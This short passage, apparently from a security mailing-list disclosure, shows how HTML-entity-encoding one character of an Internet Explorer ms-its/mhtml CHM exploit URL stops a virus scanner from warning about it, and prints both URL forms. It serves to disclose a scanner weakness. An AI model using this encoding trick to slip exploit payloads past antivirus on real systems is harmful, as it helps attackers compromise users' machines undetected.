And even that small measure of warning is trivially defeated

if I change the url in my exploit.htm from

ms-its:mhtml:file://C:\foo.mht!${PATH}/EXPLOIT.CHM::/exploit.htm

to

&#109;s-its:mhtml:file://C:\foo.mht!${PATH}/EXPLOIT.CHM::/exploit.htm

It gives no warning whatsoever, proofing once again that you  shouldn't
solely rely on virus scanners, though others might do a better job, I can't
imagine anyone doing it worse
